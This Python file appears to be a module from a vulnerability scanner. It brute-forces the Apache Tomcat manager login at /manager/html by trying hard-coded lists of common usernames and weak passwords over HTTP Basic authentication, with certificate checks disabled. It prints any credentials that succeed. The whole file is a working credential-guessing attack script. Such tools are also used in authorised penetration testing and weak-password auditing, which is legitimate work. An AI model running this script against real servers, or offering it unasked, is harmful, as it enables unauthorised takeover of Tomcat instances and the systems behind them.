import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import time
import base64

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
def week_password(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    names = ['tomcat','admin','root','manager','vps']
    passwds = ['tomcat','manager','apache','password','P@ssw0rd','P@ssword','p@ssw0rd','administrator','root','admin','admin1','admin111','admin123','admin1234','admin222','admin666','admin888','admin123!@#','tomcat123','tomcat1234','tomcat666','tomcat888'\
        ,'manager123','manager1234','manager666','manager888','abc123','abc123!@#','abcd1234','asd123','password123','password123!@#','qwe123','qwe123!@#','qwer1234','qweasd','qweasdzxc','1q2w3e','1q2w3e4r','000000','111111','123123','123456','1234567','12345678'\
        ,'123456789','147258','258369','654321','666666','66666666','7654321','888888','88888888','87654321','987654321']

    try:
        for name in names:
            name = name.rstrip()
            for passwd in passwds:
                passwd = passwd.rstrip()
                user_agent = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
                strencode = str(base64.b64encode((name + ':' + passwd).encode('utf-8')))[2:-1]
                Authorization = "Basic %s" % (strencode)
                header = {'User-Agent': user_agent, 'Authorization': Authorization}
                # try:
                url = urldata+'manager/html'
                request = requests.get(url, headers=header,verify=False,timeout=3)
                if request.status_code == 200:
                    print(Vcolors.RED + "[!] 存在Tomcat弱口令\r" + Vcolors.ENDC)
                    print(Vcolors.OKGREEN + '[Success] ' + url + ' ' + name + ':' + passwd + Vcolors.ENDC)
                    break



    except Exception as e:
        time.sleep(1)

    except:
        logging.error("week_password脚本出现异常")

